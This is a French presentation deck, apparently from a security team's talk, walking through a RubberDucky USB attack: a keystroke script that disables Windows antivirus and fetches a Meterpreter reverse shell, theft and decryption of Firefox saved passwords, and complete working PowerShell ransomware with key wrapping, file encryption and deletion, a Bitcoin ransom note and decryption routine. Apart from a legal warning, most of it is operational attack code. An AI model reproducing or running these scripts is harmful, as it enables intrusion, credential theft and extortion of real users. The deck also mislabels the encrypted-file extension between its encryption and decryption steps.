## RubberDucky
## RansomWare
## Man In The Middle SSL

### YourLabs Business Service
### SecOps team

Source: [yourlabs.io/oss/security](https://yourlabs.io/oss/security)

---

Les dispositions de la loi Godfrain sont intégrées dans le Code pénal, livre III (« Des crimes et délits contre les biens »), titre II (« Des autres atteintes aux biens »), chap. III : « Des atteintes aux systèmes de traitement automatisé de données ». Selon les infractions retenues, les peines peuvent aller de 2 ans de prison et 30 000 euros d'amende à 10 ans d'emprisonnement et 150 000 euros d'amende (pour l'une quelconque de ces infractions commise en « bande organisée » à l'encontre d'un STAD de l'État). Par ailleurs, ces peines peuvent être accompagnées de privation de droits civiques et d'autres mesures (interdiction de travailler dans la fonction publique, exclusion des marchés publics, etc.).

Note:
La loi Godfrain du 5 janvier 1988, ou Loi no 88-19 du 5 janvier 1988 relative à la fraude informatique, est la première loi française réprimant les actes de criminalité informatique et de piratage. Nommée d'après le député RPR Jacques Godfrain, c'est l'une des lois pionnières concernant le droit des NTIC, après, notamment, la loi Informatique et libertés de 1978, qui introduit la notion de système de traitement automatisé de données (STAD) et prévoit plusieurs dispositions corrélatives de la loi Godfrain (notamment concernant les obligations du responsable du traitement quant à la garantie de la sécurité des données - art. 34 loi de 1978).


---

## RubberDucky

---?image=assets/mrrobot.jpg&size=contain

Note:
- vu dans Mr. Robot
- Elliot Alderson est un jeune informaticien vivant à New York, qui travaille en tant que technicien en sécurité informatique pour Allsafe Security. Celui-ci luttant constamment contre un trouble dissociatif de l'identité et de dépression, son processus de pensée semble fortement influencé par la paranoïa et l'illusion. Il pirate les comptes des gens, ce qui le conduit souvent à agir comme un cyber-justicier. Elliot rencontre « Mr. Robot », un mystérieux anarchiste qui souhaite le recruter dans son groupe de hackers connu sous le nom de « Fsociety ». Leur objectif consiste à rétablir l'équilibre de la société par la destruction des infrastructures des plus grosses banques et entreprises du monde, notamment le conglomérat E Corp. (surnommé « Evil Corp. » par Elliot) qui, comme client, par ailleurs, représente 80 % du chiffre d’affaires d’Allsafe Security.

---

## Fonctionnement

- clef usb d'apparence anodine |
- en fait un clavier scripté |
- 1000+ mots par minute |
- marche très bien sur tout OS bien à jour |

---?image=assets/ducky.jpg&size=contain

Note:
- une clef usb
- une carte memoire pour scripter la clef usb
- un etuit pour une illusion parfaite

---?image=assets/duckyclosed.png&size=contain

Note: le logo n'est pas present sur la version de production

---

## Objectifs

- desactiver les antivirus |
- configurer un proxy |
- démarrer un reverse shell |
- insertion de certificat d'autorité |
- démarrer des scripts powershell |
- tels qu'un ransomware |

---?code=cmc/payload/meterpreter.txt&title=Exemple de script RubberDucky

@[1](Attendre 700 millisecondes)
@[2](Tappez Echap)
@[3](Attendre 100 millisecondes)
@[4](Ouvrir le menu démarrer)
@[6](Tapper "Windows Security")
@[8](Tapper Enter pour ouvrir la fenêtre de sécurité Windows)
@[10](Tapper Enter pour ouvrir "Protection")
@[11-18](Faire TAB 4 fois)
@[20](Tapper Enter pour ouvrir les paramêtres de protection)
@[22](Passe la protection de "Activée" à "Desactivée")
@[24](Passe de "Non" à "Oui" dans la confirmation)
@[26](Valide)
@[75](Ouvre l'executeur de commande)
@[77](Tapper la commande qui telecharge notre reverse shell)
@[83](Tapper la commande qui execute le reverse shell)
@[86-94](Efface les notifications pour ne pas laisser de trace)

---

# Compilation

![img](assets/comp.png)

Note:
- le compilateur est fournit en .jar c'est du java compilé et packagé
- `-i` input
- `-l` output, doit tjs etre inject.bin
- le plus important `-l` clavier

---

## Reverse shell

![img](assets/msfv.png)

Note:
- Un reverse shell est un programme qui permet d'obtennir un acces distant pour
  executer des commandes
- Le but est de l'executer sur la machine de la victime pour qu'il se
  connecte a un shell qu'on a mit en ecoute de connection sur un serveur
- On utilise Msfvenom pour creer le payoad et Metasploit pour le server
  Meterpreter (cest sur celui ci que la victime va se connecter:
- `-a`: l'architecture CPU
- `--platform`: la plateforme (windows, android, nix...)
- `-p`: Le paylaod, dans ce cas meterpreter reverse_tcp
- `LHOST`: l'ip du server meterpreter
- `LPORT`: le port du server meterpreter
- `-e`: l'encoding
- `-f`: le format
- `>` /tmp/mad/666.exe: la destination

---

# Distribution

```
cd /tmp/mad && python -m http.server
# Sous ubuntu, debian... il faut utiliser python3 -m http.server
# car python = python2 sous ArchLinux python = python3
```

Note:
Une fois pret on utilise un petit server http pour que la victime puisse telecharger notre exe malvaillante

---

![img](assets/msf.png)

---

# Demo

---?video=https://yourlabs.io/oss/security/raw/master/assets/ducky-windoz.mp4

Note:
- Conclusion: ne ramassez pas les clefs usb que vous trouvez dans la rue

---?video=https://yourlabs.io/oss/security/raw/master/assets/msf-reverseshell.mp4
---

## Usages

- Vol de mots de passe firefox |
- Keylogger |
- Screen capture |
- Downloader et uploader des fichiers |
- Implementation d'un ransome ware |
- Reconnaissance et mouvement transversaux dans le reseau |
- ... |

---

## Vol de mots de passe Firefox

```
meterpreter > shell
> powershell
> cd /users/<user> #(utilisez whoami pr le savoir)
> copy-item /users/33768/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release -destination /windows/temp/mad.default-release -recurse
> Compress-Archive -Path /windows/temp/mad.default-release -DestinationPath /windows/temp/mad.default-release.zip
> exit
> exit
meterpreter > Download /windows/temp/mad.default-release.zip /tmp
```

@[1](Lancer cmd)
@[2](Lancer powershell)
@[3-4](Copie des fichiers .default-release de firefox)
@[5](Compression dans fichiers dans une archive zip)
@[6-7](On exit 2 fois pour revenir au prompt `meterpreter >`)
@[8](Exifltration de l'archive zip)

Note:
Dans notre sessions meterpreter on zip les fichiers de profile firefox:

---

# Extraction

```
$ unzip mad.default-release.zip
$ sudo cp -r mad.default-release /home/<you>/.mozilla/firefox
$ sudo chown -R ${USER}. /home/<you>/.mozilla/firefox/mad.default-release
```

Note:
Dans un autre terminal, on unzip et place les fichier dans le repetoir ~/.mozila/firefox

---

## Configuration

```
[Profile2]
Name=default-release
IsRelative=1
Path=mad.default-release
```

Note:
Par la suite on edite `~/.mozilla/firefox/profiles.ini avec le nouveau profile`

---

## Dechiffrement

```
$ git clone https://github.com/unode/firefox_decrypt.git
$ cd firefox_decrypt
$ python firefox_decrypt.py
```

Note:
On utilise un outil appellé "firefox-decrypt":

---

## Resultat

![img](assets/password.png)

---

## Ransomware

- chiffrement symétrique des fichiers avec une clef aleatoire |
- chiffrement asymétrique de la clef avec un certificat public |
- seul le détenteur du certificat privé dechiffrera la clef |
- tout faire en mémoire pour ne laisser aucune trace |

Note:
Un rançongiciel de l'anglais ransomware, logiciel de rançon ou logiciel
d'extorsion, est un logiciel malveillant qui prend en otage des données
personnelles.

Pour ce faire, un rançongiciel chiffre des données personnelles puis demande à
leur propriétaire d'envoyer de l'argent en échange de la clé qui permettra de
les déchiffrer.

Un ransomware peut aussi bloquer l'accès de tout utilisateur à une machine
jusqu'à ce qu'une clé ou un outil de débridage soit envoyé à la victime en
échange d'une somme d'argent. Les modèles modernes de rançongiciels sont
apparus en Russie initialement, mais on constate que le nombre d'attaques de ce
type a grandement augmenté dans d'autres pays, entre autres l'Australie,
l'Allemagne, les États-Unis.

- On va chiffrer le fichier avec du chiffrement symmetrique et utiliser de
l'encryption asymmetrique pour encrypter la clée de cryptage...
- Seul ceui qui a le certificat privé poura decrypter la clé utilisée..
- Une encryption assymetrique pour tt encrypter prendrai trop de temps..

---

# Certificat

Note:
Un certificat électronique (aussi appelé certificat numérique ou certificat de clé publique) peut être vu comme une carte d'identité numérique. Il est utilisé principalement pour identifier et authentifier une personne physique ou morale, mais aussi pour chiffrer des échanges1.

Il s’agit également d’un concept très important pour tous ceux qui sont de véritables autorités en termes de sécurité informatique2.

Le standard le plus utilisé pour la création des certificats numériques est le X.509.

---

# Generation

```powershell
$cert = New-SelfSignedCertificate `
        -DnsName $YOUR_NAME `
        -CertStoreLocation "Cert:\CurrentUser\My" `
        -KeyLength 3072 `
        -HashAlgorithm "Sha384" `
        -NotBefore ((Get-Date).AddDays(-1)) `
        -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) `
        -Type DocumentEncryptionCert `
        -KeyUsage KeyEncipherment, DataEncipherment
```

---

# Export

```
> Export-Certificate -Cert $cert -FilePath "cert.cer" | Out-Null
```

---

# Texte

```
[Convert]::ToBase64String(
    [IO.File]::ReadAllBytes("/users/...../cert.cer")
)
```

Note:
base64 permet de chiffrer le certificat en texte afin de pouvoir le copier plus
facilement qu'en binaire

---

## Mot de passe

```
meterpreter > shell
> powershell
> Add-Type -AssemblyName System.web
> $pwd = [system.web.security.membership]::GeneratePassword(32,15)
> $cert = "MIIECDCCAnCgAwIBAgIQFTufS/aikLxCOTgoWoLnyDANBgkqhkiG9w0BAQwFADARMQ8wDQYDVQQDDAZteWNlcnQwIBcNMTkxMTI5MTUyODQ3WhgPMjA5OTEyMzExNTI4NDhaMBExDzANBgNVBAMMBm15Y2VydDCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAM/tJpom3ha8jKgtYzqoC2vIeJ/7xAHJ/B/q+FPS3ByhfsggnazOgMw+F6DIEnXG95wumlcF6e/M9gH2irUqwBIA0x2eDrGlH2k71ifE/iMe7TQBwe2uTDD0Vp3c6sFK6CMQOW3Ws30k2j+6E4KaUvdd52T5aYkYGCPj4MEe1noLy8t+GMDIT5bXw0TZluAGY6ExUVR8rN7AtsjBTcp9LWWw/5hlSZwDbMffYDdRlgm82QJedAYewyk6PwkjzcqsOdFV4Z8EmlIP2EM4Tnn6pHugJ3W5IIiRvNMVoPWiePBiThfR/npFnynqIDxJr973vdOjtCHBujTnU28nQfPqMb8E0lqlSeXskjZV176nuXB/1blvkNm0IYnJ/pm6i4p9mBjS0RoKlbPUg8iFcmtjjytQdjXDDtDpixyGcW/QfXyJFcfjl16A27QN3dNXEKYdhKhPSXM8zRedecpcvHl4t3iawW0EZlsFqzKlyjtr7zi5uj9nGHQajPBqNHrCXl6aJQIDAQABo1owWDAOBgNVHQ8BAf8EBAMCBDAwFAYDVR0lBA0wCwYJKwYBBAGCN1ABMBEGA1UdEQQKMAiCBm15Y2VydDAdBgNVHQ4EFgQUrwXEYlg0/q3ImayX6udhRvOTyt0wDQYJKoZIhvcNAQEMBQADggGBAHyM16X0efwFC2DwbbFT0RoFU9MLfEv1OrkaHFNPjn37p/53638o78dkBt28Hoi9LuGbN20dN7N0yu4W/cyFnuGjoz5zv2M9Tbipp+gO91jruxZmrXz6NSV/5jhAehZyP1MvVg1Nyub6n3WXkhekFQCmq0LORqBfgscwV2MNV1or2ThWCKRygrm3TgvuxPi5Wt40KrYTrp6VmVq39rXnfWJZD5oiCeIEI2OVf5BfFt1sgC4f2CQ2Ig/mjFrzzTtJWu5tNmJNknE8FIQN48LVsO7EFONXcx3VQ/WNO7Efo17BUCYl+CPNcYDMLWP/oKA/Hdbv4OTLcBbpiO0nNB1USn1YPASypVcXGC9y9Z6APBtrN4oVFY3yiuScXFjIm/fCWZN5IYpwIv3WuRG+p+X2ZE9Gw2GgeQCdpBXaS/YDix0oFHI3sRtmmUs0oKjbQEsEOgyOYnd65k5PK2Fcb/Rph0X+G97ErvOqlvhvfnvX0AosdCHnneYoBy0IcZYji2reAA=="
> $cert =  [IO.File]::WriteAllBytes("/windows/temp/x.cer", [Convert]::FromBase64String($cert))
> echo (Protect-CmsMessage -Content $pwd -To "/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
```

@[1-2](Lancer powershell depuis notre session meterpreter)
@[3-4](Creer un mot de passe random)
@[5](Notre certificat public en base64)
@[6](Décodage du certificat dans un fichier)
@[7](Sauvegarde du mot de passe chiffré avec le certificat public)

---

## Chiffrement de fichier

```powershell
Function Encr{param([string]$i,[string]$p)
  process{
    [System.Security.Cryptography.AesCryptoServiceProvider]$a=[System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $a.BlockSize=128
    $a.KeySize=256
    $a.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $a.GenerateIV();[byte[]]$IV=$a.IV;[byte[]]$k=[system.Text.Encoding]::UTF8.GetBytes($pwd)
    [System.IO.FileStream]$fout=[System.IO.FileStream]::new($i+".MAD_666",[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$IC=$a.CreateEncryptor($k,$IV)
    [System.Security.Cryptography.CryptoStream]$CS=[System.Security.Cryptography.CryptoStream]::new($fout, $IC, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [System.IO.FileStream]$fin=[System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    $fout.Write($IV,0,$IV.Count)
    $DA=$true;[int]$D
    While ($DA){
      $D=$fin.ReadByte()
      if($D -ne -1){
        $CS.WriteByte([byte]$D)
      }
      else{
        $DA = $false
      }
    }
    $fin.Dispose();
    $CS.Dispose();
    $fout.Dispose()
  }
}
```

---

## Application

```powershell
foreach ($i in
    $(Get-ChildItem /users/$env:USERNAME -recurse -include *.txt,*.jpg,*mp3 | ForEach-Object { $_.FullName })
  ){
  Encr -i $i -p $pwd
  $size = [math]::round(((Get-Item $i)).length/4)+1
  $str = "hack" * $size
  echo $str > $i
  rm $i
}
```

---

## Effacer la variable de mot de passe

```powershell
> remove-variable pwd
```


---

## Instructions victime

```
> $email = 'mon@email'
> $btc = ''
> echo "Send 0.1 btc to this account: $btc
After that, for the decryption keys and instructions for how to retrieve your files
send the content of the encrypted_keys and a proof of payment to this email:
$email" > /users/$env:USERNAME/desktop/README.txt
```

@[1](Email de l'attaquant pour envoyer la clef chiffrée)
@[2](Addresse BitCoin pour recevoir le paiement)
@[3-6](Message sur le bureau)

---

## Fond d'écran facultatif

```
> $img = 'http://xxx.xxx.Xxx/xxx.jpg'
> Invoke-WebRequest -Uri $img -OutFile "/users/$env:USERNAME/img.jpg"
> Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value "/users/$env:USERNAME/img.jpg"
> rundll32.exe user32.dll, UpdatePerUserSystemParameters
```

@[1](Définir l'URL de l'image du fond d'écran)
@[2](Télecharger l'image)
@[3](Définir le chemin de l'image à utiliser en fond d'écran)
@[4](Appliquer le nouveau fond d'écran)

---

## Redémarrer

```
> restart-computer -force
```

---

## Déchiffrement du mot de passe

Sur la machine de l'attaquant, avec le certificat privé

```
> Unprotect-CmsMessage -path .../encrypted_key.txt
```

Note:
La victime va envoyer la clée encrypter avec le certificat public, pour la
decrypter.

---

# Libération

```
$pwd = '' # Le password decrypté

function Decr{
  param([string]$i,[string]$p)
  process {
    $out = $i -replace ".{7}$"
    [System.IO.FStream]$FileStreamIn = [System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    [byte[]]$IV = New-Object byte[] 16; $FileStreamIn.Read($IV, 0, $IV.Length)
    [System.Security.Cryptography.AesCryptoServiceProvider]$Aes =  [System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $Aes.BlockSize = 128; $Aes.KeySize = 256; $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    [byte[]]$Key = [system.Text.Encoding]::UTF8.GetBytes($Password)
    [System.IO.FileStream]$FileStreamOut = [System.IO.FileStream]::new($out,[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$ICryptoTransform = $Aes.CreateDecryptor($Key,$IV)
    [System.Security.Cryptography.CryptoStream]$CryptoStream = [System.Security.Cryptography.CryptoStream]::new($FileStreamIn, $ICryptoTransform, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $DataAvailable = $true; [int]$Data
    While ($DataAvailable){
      $Data = $CryptoStream.ReadByte()
      if($Data -ne -1){
        $FileStreamOut.WriteByte([byte]$Data)
      }
      else{
        $DataAvailable = $false
      }
    }
    $FileStreamIn.Dispose()
    $CryptoStream.Dispose()
    $FileStreamOut.Dispose()
  }
}
```

---

# Boucle

```powershell
# On loop et decrypte les fichiers avec l'extention ".LCK_666"
foreach ($i in $(Get-ChildItem /users/$env:USERNAME -recurse -include *.LCK_666 | ForEach-Object { $_.FullName })){
  Decr -i $i -p $pwd
  rm $i
}
```

Note:
On envoie par mail a la victime le script qu'il devra copier-coller dans powershell...

---

# Conclusion

- pas besoin de vulnérabilité logicielle |
- si ce n'est l'accès physique |
- négligence, lockpicking, social engineering ... |
- necessite compétences variées et combinées |

---

# Merci

### yourlabs.io/oss/security
